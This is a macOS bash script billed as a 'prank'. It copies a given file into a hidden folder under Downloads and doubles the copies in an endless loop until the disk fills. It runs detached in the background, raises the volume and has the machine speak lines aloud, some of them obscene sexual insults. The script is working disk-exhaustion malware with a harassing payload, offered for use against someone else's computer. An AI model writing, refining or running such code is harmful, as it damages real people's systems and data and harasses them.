#!/bin/bash

# Karan's Ultimate Prank v3.9 - DARK GRITTY COMMENTARY EDITION
# Continuous dark humor until disk death - no mercy!

VERSION="3.9.0"
HIDDEN_DIR="$HOME/Downloads/.Karan"

# Colors
RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'
BLUE='\033[0;34m'; PURPLE='\033[0;35m'; CYAN='\033[0;36m'
BOLD='\033[1m'; BLINK='\033[5m'; BG_GREEN='\033[42m'
BG_RED='\033[41m'; BG_YELLOW='\033[43m'; BG_PURPLE='\033[45m'
WHITE='\033[1;37m'; NC='\033[0m'

# EXPANDED DARK GRITTY MESSAGES
DARK_MESSAGES=(
    "🎪 Welcome to Karan's exponential circus of doom!"
    "🔥 Burning through bytes like a digital inferno!"
    "💀 Your storage meets its exponential executioner!"
    "⚡ Doubling faster than your mounting dread!"
    "🌪️ Creating exponential chaos from digital hell!"
    "🎯 Exponential bullseye to your disk's heart!"
    "🚀 To infinity with exponential destruction!"
    "💎 Each doubling creates cursed gems!"
    "🔮 Predicting exponential digital apocalypse!"
    "🎨 Painting exponential nightmares on your drive!"
    "🎵 Can you hear your hard drive's death rattle?"
    "🍕 Exponential pizza slices of destruction!"
    "🌟 Making your disk famous for all the wrong reasons!"
    "🎭 Exponential masterpiece of digital carnage!"
    "⚡ Charging exponential storage anxiety to lethal levels!"
    "🎪 Greatest exponential horror show on earth!"
    "☠️ Your data's last supper is being served!"
    "🕷️ Spinning the web of destruction around your disk!"
    "☢️ Radioactive storage meltdown incoming!"
    "🧟‍♂️ Zombies are eating your free space alive!"
    "💀 Skeletons dancing on your hard drive's grave!"
    "🎃 Halloween came early: your disk is haunted!"
    "🌑 Black hole of storage: nothing escapes!"
    "🔪 Cutting your space like a digital surgeon!"
    "🌪️ Tornado tearing through your megabytes!"
    "💣 Storage bomb exploding bytes everywhere!"
    "🩸 Bloodbath on your file system!"
    "☣️ Virus unleashed: storage under quarantine!"
    "👻 Ghost files creeping in the digital shadows!"
    "🎭 Mask of death: your disk's final performance!"
    "🧨 Dynamite fuse lit: boom time for your drive!"
    "⛓️ Chained to destruction, your disk can't escape!"
    "🦇 Bats swarming your precious storage space!"
    "🔥 Inferno rising: no file safe tonight!"
    "🗡️ Blade of deletion cutting deep!"
    "⚰️ Digging your storage's digital grave!"
    "🦠 Malicious multiplication virus spreading!"
    "🌋 Volcanic eruption of exponential files!"
    "🕸️ Caught in the spider's web of doom!"
    "💀 Grim reaper harvesting your gigabytes!"
    "🎪 Freak show: witness your disk's demise!"
    "🔥 Dante's inferno has nothing on this!"
    "👹 Demons feasting on your free space!"
    "🌊 Tsunami of files drowning your disk!"
    "⚡ Lightning strikes: your storage is toast!"
    "🎯 Target locked: disk destruction imminent!"
    "🧪 Mad scientist's experiment gone wrong!"
    "🦈 Sharks circling your dying storage!"
    "💀 Dance with death: exponential style!"
    "🔥 Phoenix rising from your storage ashes!"
)

# DARK AUDIO MESSAGES
AUDIO_MESSAGES=(
    "i know you like some ass licking"
    "Storage space entering the void of nothingness!"
    "Exponential growth consuming your digital soul!"
    "Hard drive flatlined! Time of death: now!"
    "Your files are screaming for mercy!"
    "Disk space obituary being written!"
    "i know you like anal"
    "Your gigabytes have been terminated!"
    "how's life bitch"
    "File system entering cardiac arrest!"
    "Storage on life support: pulling the plug!"
    "Fuck you in ass"
    "Digital death sentence: executed!"
    "Your bytes are bleeding out!"
    "Storage hemorrhaging exponentially!"
    "Disk drive's final breath detected!"
    "Your storage just signed its will!"
    "your PC is Fucked for Good"
    "Storage vital signs: flatlining!"
    "Your disk's digital DNA destroyed!"
    "Storage ICU: code red emergency!"
    "Exponential virus outbreak: terminal!"
)

# Setup
setup() {
    mkdir -p "$HIDDEN_DIR"
    chflags hidden "$HIDDEN_DIR" 2>/dev/null || true
}

# Enhanced logging
log_msg() {
    echo -e "${1}${2}${NC}"
    echo "$(date): $2" >> "$HIDDEN_DIR/.log" 2>/dev/null || true
}

# Random dark message
dark_msg() {
    local msg=${DARK_MESSAGES[$RANDOM % ${#DARK_MESSAGES[@]}]}
    local colors=("$RED$BOLD" "$PURPLE$BOLD" "$YELLOW$BOLD" "$CYAN$BOLD" "$BG_RED$WHITE$BOLD")
    local color=${colors[$RANDOM % ${#colors[@]}]}
    log_msg "$color$BLINK" "$msg"
}

# Continuous dark audio (non-blocking)
speak_darkness() {
    local msg=${AUDIO_MESSAGES[$RANDOM % ${#AUDIO_MESSAGES[@]}]}
    osascript -e "set volume output volume 90" 2>/dev/null || true
    say "$msg" 2>/dev/null &
}

# EXPONENTIAL DUPLICATION WITH CONTINUOUS COMMENTARY
exponential_destruction() {
    local payload="$1"
    local round=0
    local current_count=0
    local target_count=1
    local total_comments=0
    
    # Setup
    setup
    cp "$payload" "$HIDDEN_DIR/.payload"
    
    log_msg "$BG_PURPLE$WHITE$BOLD$BLINK" "🎭 Karan's Ultimate Prank v3.9 - DARK GRITTY EDITION!"
    log_msg "$BG_RED$WHITE$BOLD" "💀 Exponential death sequence: 1→2→4→8→16→∞"
    
    # Epic dark startup
    speak_darkness
    sleep 1
    say "Welcome to the exponential theater of digital destruction!" 2>/dev/null &
    
    log_msg "$RED$BOLD$BLINK" "🚀 INITIATING EXPONENTIAL DIGITAL APOCALYPSE!"
    dark_msg
    
    # Create first file
    if ! cp "$HIDDEN_DIR/.payload" "$HIDDEN_DIR/karan_exp_$(printf "%08d" 1).jpg" 2>/dev/null; then
        log_msg "$RED$BOLD" "💾 IMMEDIATE DISK DEATH!"
        speak_darkness
        return
    fi
    current_count=1
    
    log_msg "$BG_GREEN$WHITE$BOLD" "💀 ROUND 0: First victim created (Total: 1)"
    speak_darkness
    
    # Exponential loop with CONTINUOUS commentary
    while true; do
        round=$((round + 1))
        local new_target=$((target_count * 2))
        local files_to_create=$((new_target - current_count))
        
        log_msg "$BG_YELLOW$RED$BOLD$BLINK" "🔥 ROUND $round: Doubling the carnage $current_count → $new_target!"
        dark_msg
        speak_darkness
        
        # Create files with CONSTANT commentary
        local created_this_round=0
        for ((i=1; i<=files_to_create; i++)); do
            local new_file_num=$((current_count + i))
            local source_file_num=$(((new_file_num - 1) % current_count + 1))
            
            # Attempt duplication
            if ! cp "$HIDDEN_DIR/karan_exp_$(printf "%08d" $source_file_num).jpg" \
                    "$HIDDEN_DIR/karan_exp_$(printf "%08d" $new_file_num).jpg" 2>/dev/null; then
                log_msg "$BG_RED$WHITE$BOLD$BLINK" "💀 DISK FLATLINED! Final body count: $((current_count + created_this_round))!"
                say "Exponential mission of destruction accomplished! Your disk has been terminated with extreme prejudice!" 2>/dev/null &
                return
            fi
            
            created_this_round=$((created_this_round + 1))
            total_comments=$((total_comments + 1))
            
            # CONTINUOUS dark commentary every few files
            if [[ $((created_this_round % 25)) -eq 0 ]]; then
                dark_msg
            fi
            
            # CONTINUOUS audio every 50 files
            if [[ $((created_this_round % 50)) -eq 0 ]]; then
                speak_darkness
            fi
            
            # Progress during large rounds
            if [[ $((created_this_round % 200)) -eq 0 ]] && [[ $files_to_create -gt 1000 ]]; then
                log_msg "$CYAN$BOLD" "⚡ Round $round carnage: $created_this_round/$files_to_create victims eliminated..."
                speak_darkness
            fi
        done
        
        current_count=$new_target
        target_count=$new_target
        
        # Round completion with dark celebration
        log_msg "$BG_GREEN$WHITE$BOLD" "💀 ROUND $round COMPLETE: Total casualties = $current_count"
        dark_msg
        speak_darkness
        
        # Exponential milestones with EXTRA dark commentary
        case $current_count in
            2)
                log_msg "$YELLOW$BOLD$BLINK" "🎉 DOUBLED TO 2! The exponential nightmare begins!"
                say "Two victims down! Your storage's death sentence has been signed!" 2>/dev/null &
                ;;
            16)
                log_msg "$RED$BOLD$BLINK" "🔥 REACHED 16! Exponential hellfire unleashed!"
                say "Sixteen casualties! Your disk is bleeding bytes!" 2>/dev/null &
                ;;
            256)
                log_msg "$PURPLE$BOLD$BLINK" "💎 256 FILES! Exponential death mastery achieved!"
                say "Two hundred fifty six files of destruction! Your storage is on life support!" 2>/dev/null &
                ;;
            4096)
                log_msg "$BG_RED$WHITE$BOLD$BLINK" "🚀 4096 FILES! EXPONENTIAL ARMAGEDDON!"
                say "Four thousand files! Digital apocalypse initiated!" 2>/dev/null &
                ;;
            65536)
                log_msg "$BG_PURPLE$WHITE$BOLD$BLINK" "👑 65,536 FILES! EXPONENTIAL EMPEROR OF DESTRUCTION!"
                say "Sixty five thousand files! You are the harbinger of storage doom!" 2>/dev/null &
                ;;
        esac
        
        # Extra dark messages every few rounds
        if [[ $((round % 2)) -eq 0 ]]; then
            dark_msg
            speak_darkness
        fi
        
        # Brief pause to let audio play
        sleep 0.2
    done
}

# Validate
validate() {
    [[ "$(uname)" == "Darwin" ]] || { echo "💀 ERROR: macOS required for this digital carnage!"; exit 1; }
    [[ -f "$1" ]] || { echo "🔍 ERROR: Payload not found for destruction!"; exit 1; }
}

# Execution
if [[ "$2" == "--execute" ]]; then
    # Background execution with logging
    exec >> "$HIDDEN_DIR/.log" 2>&1
    exponential_destruction "$1"
else
    # Launch the dark destruction
    validate "$1"
    setup
    "$0" "$1" --execute &
    disown
fi
